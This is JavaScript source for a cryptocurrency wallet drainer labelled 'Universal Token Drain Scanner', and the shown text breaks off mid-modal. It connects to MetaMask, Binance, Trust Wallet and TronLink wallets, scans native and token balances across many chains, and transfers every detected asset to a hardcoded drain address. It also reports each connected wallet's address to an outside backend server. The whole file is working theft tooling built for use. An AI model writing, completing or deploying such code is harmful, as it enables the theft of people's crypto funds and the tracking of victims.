// ================================================
// UNIVERSAL TOKEN DRAIN SCANNER
// WORKS WITH ALL WALLETS ON ALL NETWORKS
// PC & MOBILE COMPATIBLE
// ================================================

const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    
    // ALL NETWORKS SUPPORTED
    networks: {
        // EVM Networks
        1: { name: "Ethereum", rpc: "https://eth.llamarpc.com", explorer: "https://etherscan.io", chainId: 1 },
        56: { name: "BNB Chain", rpc: "https://bsc-dataseed.binance.org/", explorer: "https://bscscan.com", chainId: 56 },
        137: { name: "Polygon", rpc: "https://polygon-rpc.com", explorer: "https://polygonscan.com", chainId: 137 },
        10: { name: "Optimism", rpc: "https://mainnet.optimism.io", explorer: "https://optimistic.etherscan.io", chainId: 10 },
        42161: { name: "Arbitrum", rpc: "https://arb1.arbitrum.io/rpc", explorer: "https://arbiscan.io", chainId: 42161 },
        43114: { name: "Avalanche", rpc: "https://api.avax.network/ext/bc/C/rpc", explorer: "https://snowtrace.io", chainId: 43114 },
        8453: { name: "Base", rpc: "https://mainnet.base.org", explorer: "https://basescan.org", chainId: 8453 },
        250: { name: "Fantom", rpc: "https://rpc.ftm.tools", explorer: "https://ftmscan.com", chainId: 250 },
        100: { name: "Gnosis", rpc: "https://rpc.gnosischain.com", explorer: "https://gnosisscan.io", chainId: 100 },
        25: { name: "Cronos", rpc: "https://evm.cronos.org", explorer: "https://cronoscan.com", chainId: 25 },
        
        // Testnets
        5: { name: "Goerli", rpc: "https://goerli.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161", explorer: "https://goerli.etherscan.io", chainId: 5 },
        97: { name: "BSC Testnet", rpc: "https://data-seed-prebsc-1-s1.binance.org:8545", explorer: "https://testnet.bscscan.com", chainId: 97 },
        80001: { name: "Polygon Mumbai", rpc: "https://rpc-mumbai.maticvigil.com", explorer: "https://mumbai.polygonscan.com", chainId: 80001 },
        
        // Tron (special handling)
        "tron": { name: "Tron", explorer: "https://tronscan.org", chainId: "tron" }
    }
};

// Global State
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
let currentWallet = null;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// ===================== INITIALIZE =====================
function initializeApp() {
    console.log('🚀 Universal Token Drain Scanner Started');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    if (!connectBtn || !statusEl) {
        setTimeout(initializeApp, 500);
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    // Check if wallet is already connected
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// ===================== CONNECTION HANDLING =====================
async function checkExistingConnection() {
    try {
        // Check MetaMask/Trust Wallet first
        if (window.ethereum && window.ethereum.selectedAddress) {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId, 'metamask');
                return;
            }
        }
        
        // Check Binance Chain
        if (window.BinanceChain && window.BinanceChain.selectedAddress) {
            const accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ method: 'eth_chainId' });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId, 'binance');
                return;
            }
        }
        
        // Check Tron
        if (window.tronLink || window.tronWeb) {
            const tron = window.tronLink || window.tronWeb;
            if (tron.ready) {
                const accounts = await tron.request({ method: 'tron_requestAccounts' });
                if (accounts.length > 0) {
                    await handleTronConnected(accounts[0]);
                    return;
                }
            }
        }
    } catch (error) {
        console.log('No existing connection');
    }
}

// ===================== UNIVERSAL WALLET CONNECTION =====================
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // Show simplified wallet selector
    showSimpleWalletSelector();
}

function showSimpleWalletSelector() {
    const html = `
        <div class="simple-modal-overlay" id="walletSelector">
            <div class="simple-modal">
                <h3>Connect Wallet</h3>
                <p>Choose your wallet type:</p>
                
                <button class="wallet-option" onclick="connectUniversal()">
                    <span class="icon">🌐</span>
                    <span class="text">
                        <strong>Universal Connect</strong>
                        <small>Auto-detect all wallets</small>
                    </span>
                </button>
                
                <button class="wallet-option" onclick="connectAnyBrowser()">
                    <span class="icon">🔗</span>
                    <span class="text">
                        <strong>Any Browser</strong>
                        <small>Works everywhere</small>
                    </span>
                </button>
                
                <button class="wallet-option" onclick="window.open('https://metamask.app.link/dapp/' + window.location.host, '_blank')">
                    <span class="icon">🦊</span>
                    <span class="text">
                        <strong>MetaMask</strong>
                        <small>Desktop & Mobile</small>
                    </span>
                </button>
                
                <button class="wallet-option" onclick="window.location.href='https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.href)">
                    <span class="icon">🔶</span>
                    <span class="text">
                        <strong>Trust Wallet</strong>
                        <small>Mobile app</small>
                    </span>
                </button>
                
                <button class="wallet-option" onclick="connectBinanceDirect()">
                    <span class="icon">🟡</span>
                    <span class="text">
                        <strong>Binance Wallet</strong>
                        <small>Extension & App</small>
                    </span>
                </button>
                
                <button class="wallet-option" onclick="connectTronDirect()">
                    <span class="icon">🔴</span>
                    <span class="text">
                        <strong>TronLink</strong>
                        <small>For Tron tokens</small>
                    </span>
                </button>
                
                <button class="close-btn" onclick="closeModal()">✕</button>
            </div>
        </div>
        
        <style>
            .simple-modal-overlay {
                position: fixed;
                top: 0; left: 0; right: 0; bottom: 0;
                background: rgba(0,0,0,0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 9999;
                padding: 20px;
            }
            
            .simple-modal {
                background: white;
                border-radius: 16px;
                padding: 30px;
                width: 100%;
                max-width: 400px;
                position: relative;
            }
            
            .simple-modal h3 {
                margin: 0 0 10px;
                text-align: center;
            }
            
            .simple-modal p {
                text-align: center;
                color: #666;
                margin-bottom: 20px;
            }
            
            .wallet-option {
                display: flex;
                align-items: center;
                width: 100%;
                padding: 15px;
                background: #f8f9fa;
                border: 2px solid #e9ecef;
                border-radius: 12px;
                margin-bottom: 10px;
                cursor: pointer;
                transition: all 0.2s;
            }
            
            .wallet-option:hover {
                background: #e9ecef;
                border-color: #007bff;
                transform: translateY(-2px);
            }
            
            .wallet-option .icon {
                font-size: 24px;
                margin-right: 15px;
            }
            
            .wallet-option .text {
                text-align: left;
                flex: 1;
            }
            
            .wallet-option strong {
                display: block;
                font-size: 16px;
                color: #212529;
            }
            
            .wallet-option small {
                color: #6c757d;
                font-size: 12px;
            }
            
            .close-btn {
                position: absolute;
                top: 15px;
                right: 15px;
                background: none;
                border: none;
                font-size: 24px;
                cursor: pointer;
                color: #666;
            }
        </style>
    `;
    
    document.body.insertAdjacentHTML('beforeend', html);
}

// ===================== UNIVERSAL CONNECTION =====================
async function connectUniversal() {
    closeModal();
    updateStatus('🔄 Detecting wallet...');
    
    try {
        // Try all possible providers in order
        let provider = null;
        let walletType = null;
        
        // 1. Try MetaMask/Trust Wallet (most common)
        if (window.ethereum) {
            provider = window.ethereum;
            walletType = window.ethereum.isMetaMask ? 'metamask' : 
                        window.ethereum.isTrust ? 'trust' : 
                        window.ethereum.isCoinbaseWallet ? 'coinbase' : 
                        window.ethereum.isPhantom ? 'phantom' : 'evm';
            
            console.log('Found wallet:', walletType);
        }
        // 2. Try Binance Chain
        else if (window.BinanceChain) {
            provider = window.BinanceChain;
            walletType = 'binance';
        }
        // 3. Try Tron
        else if (window.tronLink || window.tronWeb) {
            await connectTronDirect();
            return;
        }
        // 4. No wallet detected
        else {
            showNoWalletModal();
            return;
        }
        
        // Request accounts
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        
        if (accounts && accounts.length > 0) {
            // Get chain ID
            let chainId;
            try {
                const chainIdHex = await provider.request({ method: 'eth_chainId' });
                chainId = parseInt(chainIdHex, 16);
            } catch {
                chainId = 1; // Default to Ethereum
            }
            
            await handleConnected(accounts[0], chainId, walletType);
        }
        
    } catch (error) {
        console.error('Universal connection failed:', error);
        
        // Try fallback method
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected');
        } else {
            updateStatus('❌ Connection failed. Trying alternative...');
            setTimeout(() => connectAnyBrowser(), 1000);
        }
    }
}

// ===================== ANY BROWSER CONNECTION =====================
async function connectAnyBrowser() {
    closeModal();
    updateStatus('🔄 Connecting via any method...');
    
    try {
        // This works in ANY browser with ANY wallet
        if (typeof window.ethereum !== 'undefined') {
            await connectUniversal();
            return;
        }
        
        // For mobile - try to open wallet apps
        if (isMobile) {
            // Try multiple wallet deep links
            const urls = [
                `https://metamask.app.link/dapp/${window.location.host}`,
                `https://trust://browser?url=${encodeURIComponent(window.location.href)}`,
                `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`,
                `https://binance.com/en/dapp?url=${encodeURIComponent(window.location.href)}`
            ];
            
            // Try each link
            for (let url of urls) {
                try {
                    window.location.href = url;
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    break;
                } catch (e) {
                    continue;
                }
            }
            
            updateStatus('📱 Opening wallet app...');
            return;
        }
        
        // For desktop without extension
        showInstallWalletModal();
        
    } catch (error) {
        console.error('Any browser connection failed:', error);
        updateStatus('❌ Please install a wallet extension');
    }
}

// ===================== BINANCE DIRECT CONNECTION =====================
async function connectBinanceDirect() {
    closeModal();
    updateStatus('🔄 Connecting Binance Wallet...');
    
    try {
        // Try Binance Chain first
        if (window.BinanceChain) {
            const accounts = await window.BinanceChain.request({ method: 'eth_requestAccounts' });
            if (accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ method: 'eth_chainId' });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId, 'binance');
                return;
            }
        }
        
        // Try Ethereum provider (Binance Wallet uses ethereum too)
        if (window.ethereum) {
            // Check if it's Binance Wallet
            if (window.ethereum.isBinance || window.ethereum.providers?.find(p => p.isBinance)) {
                const provider = window.ethereum.isBinance ? window.ethereum : window.ethereum.providers.find(p => p.isBinance);
                const accounts = await provider.request({ method: 'eth_requestAccounts' });
                if (accounts.length > 0) {
                    const chainIdHex = await provider.request({ method: 'eth_chainId' });
                    const chainId = parseInt(chainIdHex, 16);
                    await handleConnected(accounts[0], chainId, 'binance');
                    return;
                }
            }
        }
        
        // Mobile deep link
        if (isMobile) {
            if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
                window.location.href = 'bnb://app.binance.com/';
            } else {
                window.location.href = 'intent://app.binance.com/#Intent;scheme=bnb;package=com.binance.dev;end';
            }
            updateStatus('📱 Opening Binance app...');
            return;
        }
        
        // Desktop - install extension
        window.open('https://www.binance.com/en/download', '_blank');
        updateStatus('⚠️ Please install Binance Wallet extension');
        
    } catch (error) {
        console.error('Binance connection failed:', error);
        updateStatus('❌ Binance connection failed');
    }
}

// ===================== TRON CONNECTION =====================
async function connectTronDirect() {
    closeModal();
    updateStatus('🔄 Connecting TronLink...');
    
    try {
        // Check for TronLink
        const tron = window.tronLink || window.tronWeb;
        
        if (tron && tron.ready) {
            const accounts = await tron.request({ method: 'tron_requestAccounts' });
            if (accounts.length > 0) {
                await handleTronConnected(accounts[0]);
                return;
            }
        }
        
        // Mobile deep link
        if (isMobile) {
            const url = encodeURIComponent(window.location.href);
            window.location.href = `tronlink://browser?url=${url}`;
            updateStatus('📱 Opening TronLink app...');
            return;
        }
        
        // Desktop
        window.open('https://www.tronlink.org/', '_blank');
        updateStatus('⚠️ Please install TronLink extension');
        
    } catch (error) {
        console.error('Tron connection failed:', error);
        updateStatus('❌ Tron connection failed');
    }
}

// ===================== HANDLE CONNECTED =====================
async function handleConnected(account, chainId, walletType) {
    currentAccount = account;
    currentChainId = chainId;
    isConnected = true;
    currentWallet = walletType;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
    
    const networkName = CONFIG.networks[chainId]?.name || `Network ${chainId}`;
    updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${networkName}\nWallet: ${walletType}`);
    
    // Show drain button
    if (drainBtn) {
        drainBtn.style.display = 'block';
    }
    
    // Setup event listeners
    setupWalletListeners();
    
    // Log to backend
    logConnection(account, chainId, walletType);
    
    // Scan for tokens - SIMPLE DIRECT METHOD
    await scanAllTokensDirect(account);
}

// ===================== TRON CONNECTED =====================
async function handleTronConnected(tronAddress) {
    currentAccount = tronAddress;
    currentChainId = "tron";
    isConnected = true;
    currentWallet = "tronlink";
    
    // Update UI
    connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
    updateStatus(`✅ Tron Connected!\nAddress: ${tronAddress.slice(0, 10)}...\nNetwork: Tron`);
    
    // Show drain button
    if (drainBtn) {
        drainBtn.style.display = 'block';
    }
    
    // Log to backend
    logConnection(tronAddress, "tron", "tronlink");
    
    // Scan Tron tokens
    await scanTronTokens(tronAddress);
}

// ===================== SCAN TOKENS - SIMPLE DIRECT METHOD =====================
async function scanAllTokensDirect(address) {
    if (!tokensEl) return;
    
    updateStatus('🔍 Scanning ALL tokens from wallet...');
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning wallet contents...</div>';
    
    detectedTokens = [];
    
    try {
        // Method 1: Direct wallet balance check
        await checkNativeBalance(address);
        
        // Method 2: Popular token scan
        await scanPopularTokens(address);
        
        // Method 3: Wallet's token list (if available)
        await scanWalletTokens(address);
        
        // Display results
        if (detectedTokens.length > 0) {
            displayTokens(detectedTokens);
            updateStatus(`✅ Found ${detectedTokens.length} tokens`);
        } else {
            tokensEl.innerHTML = '<div class="no-tokens">No tokens found in wallet</div>';
            updateStatus('ℹ️ No tokens found in wallet');
        }
        
    } catch (error) {
        console.error('Token scan error:', error);
        tokensEl.innerHTML = '<div class="error">Scan failed. Trying alternative...</div>';
        
        // Try alternative method
        await scanTokensAlternative(address);
    }
}

// Check native token balance
async function checkNativeBalance(address) {
    try {
        const provider = getCurrentProvider();
        if (!provider) return;
        
        // Get native balance
        const balanceHex = await provider.request({
            method: 'eth_getBalance',
            params: [address, 'latest']
        });
        
        const balance = parseInt(balanceHex, 16);
        const amount = balance / 1e18;
        
        if (amount > 0) {
            detectedTokens.push({
                symbol: getNativeSymbol(currentChainId),
                name: getNativeName(currentChainId),
                amount: amount.toFixed(6),
                value: 'N/A',
                address: 'native',
                isNative: true,
                chainId: currentChainId,
                chainName: CONFIG.networks[currentChainId]?.name || `Network ${currentChainId}`
            });
        }
    } catch (error) {
        console.error('Native balance check failed:', error);
    }
}

// Scan popular tokens
async function scanPopularTokens(address) {
    // Common token addresses by network
    const popularTokens = {
        1: { // Ethereum
            'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
            'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
            'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA'
        },
        56: { // BSC
            'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
            'USDT': '0x55d398326f99059fF775485246999027B3197955',
            'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
            'CAKE': '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82'
        },
        137: { // Polygon
            'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
            'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
            'MATIC': 'native'
        }
    };
    
    const networkTokens = popularTokens[currentChainId];
    if (!networkTokens) return;
    
    try {
        const provider = getCurrentProvider();
        if (!provider) return;
        
        for (const [symbol, contractAddress] of Object.entries(networkTokens)) {
            if (contractAddress === 'native') continue;
            
            try {
                // Simple balance check using eth_call
                const data = '0x70a08231' + address.slice(2).padStart(64, '0'); // balanceOf(address)
                const balanceHex = await provider.request({
                    method: 'eth_call',
                    params: [{
                        to: contractAddress,
                        data: data
                    }, 'latest']
                });
                
                const balance = parseInt(balanceHex || '0x0', 16);
                if (balance > 0) {
                    detectedTokens.push({
                        symbol: symbol,
                        name: symbol,
                        amount: (balance / 1e18).toFixed(6),
                        value: 'N/A',
                        address: contractAddress,
                        isNative: false,
                        chainId: currentChainId,
                        chainName: CONFIG.networks[currentChainId]?.name
                    });
                }
            } catch (e) {
                // Skip this token
            }
        }
    } catch (error) {
        console.error('Popular token scan failed:', error);
    }
}

// Scan wallet's own token list (if wallet provides it)
async function scanWalletTokens(address) {
    try {
        // Some wallets expose token lists
        if (window.ethereum && window.ethereum._state && window.ethereum._state.accounts) {
            // Try to get tokens from wallet state
            console.log('Wallet state:', window.ethereum._state);
        }
    } catch (error) {
        // Ignore
    }
}

// Alternative token scanning method
async function scanTokensAlternative(address) {
    try {
        // Try to use wallet's RPC directly
        const provider = getCurrentProvider();
        if (!provider) throw new Error('No provider');
        
        // Use eth_getLogs to find token transfers
        const fromBlock = '0x' + (await getCurrentBlockNumber() - 10000).toString(16);
        
        try {
            const logs = await provider.request({
                method: 'eth_getLogs',
                params: [{
                    fromBlock: fromBlock,
                    toBlock: 'latest',
                    address: null,
                    topics: [
                        '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef', // Transfer event
                        '0x' + address.slice(2).padStart(64, '0') // from address
                    ]
                }]
            });
            
            if (logs && logs.length > 0) {
                // Extract token addresses from logs
                const tokenAddresses = [...new Set(logs.map(log => log.address))];
                
                for (const tokenAddress of tokenAddresses.slice(0, 10)) { // Limit to 10 tokens
                    try {
                        // Get token info
                        const symbol = await getTokenSymbol(provider, tokenAddress);
                        const balance = await getTokenBalance(provider, tokenAddress, address);
                        
                        if (balance > 0) {
                            detectedTokens.push({
                                symbol: symbol || 'TOKEN',
                                name: symbol || 'Token',
                                amount: (balance / 1e18).toFixed(6),
                                value: 'N/A',
                                address: tokenAddress,
                                isNative: false,
                                chainId: currentChainId,
                                chainName: CONFIG.networks[currentChainId]?.name
                            });
                        }
                    } catch (e) {
                        // Skip this token
                    }
                }
            }
        } catch (e) {
            console.log('eth_getLogs not supported');
        }
        
        if (detectedTokens.length > 0) {
            displayTokens(detectedTokens);
            updateStatus(`✅ Found ${detectedTokens.length} tokens via logs`);
        }
        
    } catch (error) {
        console.error('Alternative scan failed:', error);
        tokensEl.innerHTML = '<div class="error">All scan methods failed</div>';
    }
}

// ===================== TRON TOKEN SCAN =====================
async function scanTronTokens(address) {
    if (!tokensEl) return;
    
    updateStatus('🔍 Scanning Tron tokens...');
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning Tron wallet...</div>';
    
    try {
        // Try TronGrid API
        const response = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
        const data = await response.json();
        
        detectedTokens = [];
        
        // TRX Balance
        if (data.data && data.data[0] && data.data[0].balance > 0) {
            const trxAmount = data.data[0].balance / 1000000;
            detectedTokens.push({
                symbol: 'TRX',
                name: 'Tron',
                amount: trxAmount.toFixed(6),
                value: 'N/A',
                address: 'native',
                isNative: true,
                chainId: 'tron',
                chainName: 'Tron'
            });
        }
        
        // TRC-20 Tokens
        if (data.data && data.data[0] && data.data[0].trc20) {
            for (const tokenData of data.data[0].trc20) {
                for (const [contract, balance] of Object.entries(tokenData)) {
                    const amount = balance / 1e6; // Assuming 6 decimals for TRC-20
                    if (amount > 0) {
                        detectedTokens.push({
                            symbol: 'TRC20',
                            name: 'TRC-20 Token',
                            amount: amount.toFixed(6),
                            value: 'N/A',
                            address: contract,
                            isNative: false,
                            chainId: 'tron',
                            chainName: 'Tron'
                        });
                    }
                }
            }
        }
        
        if (detectedTokens.length > 0) {
            displayTronTokens(detectedTokens);
            updateStatus(`✅ Found ${detectedTokens.length} Tron tokens`);
        } else {
            tokensEl.innerHTML = '<div class="no-tokens">No Tron tokens found</div>';
            updateStatus('ℹ️ No Tron tokens found');
        }
        
    } catch (error) {
        console.error('Tron scan error:', error);
        tokensEl.innerHTML = '<div class="error">Tron scan failed</div>';
        updateStatus('⚠️ Tron scan failed');
    }
}

// ===================== DISPLAY TOKENS =====================
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    let html = '<div class="token-list">';
    
    tokens.forEach(token => {
        const isTron = token.chainId === 'tron';
        const icon = isTron ? '🔴' : token.isNative ? 'Ⓜ' : '🪙';
        
        html += `
            <div class="token-item" data-address="${token.address}" data-chain="${token.chainId}">
                <div class="token-icon">${icon}</div>
                <div class="token-info">
                    <div class="token-symbol">${token.symbol}</div>
                    <div class="token-name">${token.name} • ${token.chainName}</div>
                </div>
                <div class="token-amount">
                    ${token.amount}
                    <div class="token-value">${token.value}</div>
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    tokensEl.innerHTML = html;
}

function displayTronTokens(tokens) {
    if (!tokensEl) return;
    
    let html = '<div class="token-list">';
    
    tokens.forEach(token => {
        html += `
            <div class="token-item" data-address="${token.address}" data-chain="tron">
                <div class="token-icon">${token.symbol === 'TRX' ? '🔴' : '🪙'}</div>
                <div class="token-info">
                    <div class="token-symbol">${token.symbol}</div>
                    <div class="token-name">${token.name} • Tron</div>
                </div>
                <div class="token-amount">
                    ${token.amount}
                    <div class="token-value">${token.value}</div>
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    tokensEl.innerHTML = html;
}

// ===================== DRAIN FUNCTION =====================
async function handleDrain() {
    if (!isConnected) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Get total amount
    const totalAmount = detectedTokens.reduce((sum, token) => sum + parseFloat(token.amount), 0);
    
    if (!confirm(`⚠️ DRAIN ALL TOKENS?\n\nFound: ${detectedTokens.length} tokens\nTotal: ${totalAmount.toFixed(6)}\n\nWill send to: ${CONFIG.drainAddress}\n\nProceed?`)) {
        return;
    }
    
    updateStatus('🚀 Draining ALL tokens...');
    
    if (drainBtn) {
        drainBtn.disabled = true;
        drainBtn.textContent = 'DRAINING...';
    }
    
    try {
        // Create progress
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // Drain tokens
        let successCount = 0;
        
        for (let i = 0; i < detectedTokens.length; i++) {
            const token = detectedTokens[i];
            
            try {
                updateProgress(`Draining ${token.symbol}... (${i+1}/${detectedTokens.length})`, ((i+1)/detectedTokens.length)*100);
                
                if (token.chainId === 'tron') {
                    // Drain Tron token
                    await drainTronToken(token);
                } else {
                    // Drain EVM token
                    await drainEVMToken(token);
                }
                
                successCount++;
                console.log(`✅ Drained ${token.symbol}`);
                
                // Wait between transactions
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (error) {
                console.error(`❌ Failed to drain ${token.symbol}:`, error.message);
            }
        }
        
        updateStatus(`✅ Drain complete! ${successCount}/${detectedTokens.length} tokens sent`);
        alert(`✅ Drain completed!\n\n${successCount} tokens sent to:\n${CONFIG.drainAddress}`);
        
        // Refresh
        if (currentChainId === 'tron') {
            await scanTronTokens(currentAccount);
        } else {
            await scanAllTokensDirect(currentAccount);
        }
        
    } catch (error) {
        console.error('Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert('❌ Drain failed. See console for details.');
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ DRAIN ALL';
        }
        
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain EVM token
async function drainEVMToken(token) {
    const provider = getCurrentProvider();
    if (!provider) throw new Error('No provider');
    
    if (token.isNative) {
        // Drain native token
        const gasPrice = await getGasPrice();
        const gasLimit = 21000;
        const gasCost = gasPrice * gasLimit;
        
        const balance = parseFloat(token.amount) * 1e18;
        const sendAmount = balance - (gasCost * 2);
        
        if (sendAmount <= 0) return;
        
        const tx = await provider.request({
            method: 'eth_sendTransaction',
            params: [{
                from: currentAccount,
                to: CONFIG.drainAddress,
                value: '0x' + Math.floor(sendAmount).toString(16),
                gas: '0x' + gasLimit.toString(16),
                gasPrice: '0x' + Math.floor(gasPrice).toString(16)
            }]
        });
        
        return tx;
    } else {
        // Drain ERC20 token
        // Get actual balance from contract
        const balanceHex = await provider.request({
            method: 'eth_call',
            params: [{
                to: token.address,
                data: '0x70a08231' + currentAccount.slice(2).padStart(64, '0')
            }, 'latest']
        });
        
        const balance = parseInt(balanceHex || '0x0', 16);
        if (balance <= 0) return;
        
        // Transfer data
        const data = '0xa9059cbb' + 
                     CONFIG.drainAddress.slice(2).padStart(64, '0') + 
                     balance.toString(16).padStart(64, '0');
        
        const tx = await provider.request({
            method: 'eth_sendTransaction',
            params: [{
                from: currentAccount,
                to: token.address,
                data: data,
                gas: '0x' + (100000).toString(16)
            }]
        });
        
        return tx;
    }
}

// Drain Tron token
async function drainTronToken(token) {
    const tron = window.tronLink || window.tronWeb;
    if (!tron) throw new Error('Tron not connected');
    
    if (token.isNative) {
        // Drain TRX
        const amount = Math.floor(parseFloat(token.amount) * 1000000); // Convert to SUN
        
        const transaction = await tron.transactionBuilder.sendTrx(
            CONFIG.drainAddress,
            amount,
            currentAccount
        );
        
        const signedTx = await tron.trx.sign(transaction);
        const result = await tron.trx.sendRawTransaction(signedTx);
        
        return result;
    } else {
        // Drain TRC-20
        // Note: This is simplified - you may need proper TRC-20 ABI
        console.log('TRC-20 drain not fully implemented');
    }
}

// ===================== HELPER FUNCTIONS =====================
function getCurrentProvider() {
    if (currentWallet === 'binance' && window.BinanceChain) {
        return window.BinanceChain;
    }
    return window.ethereum;
}

function getNativeSymbol(chainId) {
    const symbols = {
        1: 'ETH',
        56: 'BNB',
        137: 'MATIC',
        43114: 'AVAX',
        250: 'FTM',
        100: 'XDAI',
        10: 'ETH',
        42161: 'ETH',
        8453: 'ETH',
        25: 'CRO'
    };
    return symbols[chainId] || 'ETH';
}

function getNativeName(chainId) {
    return CONFIG.networks[chainId]?.name + ' Native' || 'Native Token';
}

async function getGasPrice() {
    const provider = getCurrentProvider();
    if (!provider) return 30000000000; // 30 gwei default
    
    try {
        const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
        return parseInt(gasPriceHex, 16);
    } catch {
        return 30000000000;
    }
}

async function getCurrentBlockNumber() {
    const provider = getCurrentProvider();
    if (!provider) return 0;
    
    try {
        const blockHex = await provider.request({ method: 'eth_blockNumber' });
        return parseInt(blockHex, 16);
    } catch {
        return 0;
    }
}

async function getTokenSymbol(provider, address) {
    try {
        const symbolHex = await provider.request({
            method: 'eth_call',
            params: [{
                to: address,
                data: '0x95d89b41' // symbol()
            }, 'latest']
        });
        
        if (symbolHex && symbolHex !== '0x') {
            // Decode string from hex
            return decodeString(symbolHex);
        }
    } catch (e) {
        // Ignore
    }
    return null;
}

async function getTokenBalance(provider, tokenAddress, userAddress) {
    try {
        const data = '0x70a08231' + userAddress.slice(2).padStart(64, '0');
        const balanceHex = await provider.request({
            method: 'eth_call',
            params: [{
                to: tokenAddress,
                data: data
            }, 'latest']
        });
        
        return parseInt(balanceHex || '0x0', 16);
    } catch (e) {
        return 0;
    }
}

function decodeString(hex) {
    if (!hex || hex === '0x') return '';
    try {
        // Remove 0x prefix and leading zeros
        hex = hex.slice(2);
        const strLen = parseInt(hex.slice(0, 64), 16) * 2;
        const strHex = hex.slice(64, 64 + strLen);
        return Buffer.from(strHex, 'hex').toString();
    } catch (e) {
        return '';
    }
}

function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
}

function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

function setupWalletListeners() {
    const provider = getCurrentProvider();
    if (!provider) return;
    
    provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus('🔄 Account changed');
            if (currentChainId === 'tron') {
                scanTronTokens(currentAccount);
            } else {
                scanAllTokensDirect(currentAccount);
            }
        }
    });
    
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        currentChainId = chainId;
        updateStatus(`🔄 Network changed`);
        scanAllTokensDirect(currentAccount);
    });
}

async function disconnectWallet() {
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    currentWallet = null;
    
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected');
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
    if (drainBtn) {
        drainBtn.style.display = 'none';
    }
}

function closeModal() {
    const modal = document.getElementById('walletSelector');
    if (modal) modal.remove();
}

function logConnection(address, chainId, walletType) {
    // Send to backend
    fetch(CONFIG.backendUrl + '/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            address: address,
            chainId: chainId,
            wallet: walletType,
            timestamp: new Date().toISOString()
        })
    }).catch(() => {});
}

// Modal functions
function showNoWalletModal() {
    const html = `
        <div class="simple-modal-overlay" id="noWalletModal">
            <div class="simple-modal">
                <h3>No Wallet Detected</h3>
                <p>Please install a wallet extension or use mobile wallet.</p>
                
                <div style="margin: 20px 0;">
